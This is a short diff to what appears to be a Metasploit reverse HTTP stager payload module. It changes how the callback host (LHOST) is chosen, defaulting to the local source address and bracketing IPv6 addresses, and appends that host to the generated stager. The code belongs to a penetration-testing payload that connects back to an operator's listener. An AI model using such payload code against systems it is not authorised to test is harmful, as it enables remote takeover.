@@ -79,7 +79,13 @@ module Metasploit3
     i = p.index("/12345\x00")
     u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW) + "\x00"
     p[i, u.length] = u
-    p + datastore['LHOST'].to_s + "\x00"
+
+    lhost = datastore['LHOST'] || Rex::Socket.source_address
+    if Rex::Socket.is_ipv6?(lhost)
+      lhost = "[#{lhost}]"
+    end
+
+    p + lhost + "\x00"
   end
 
   #
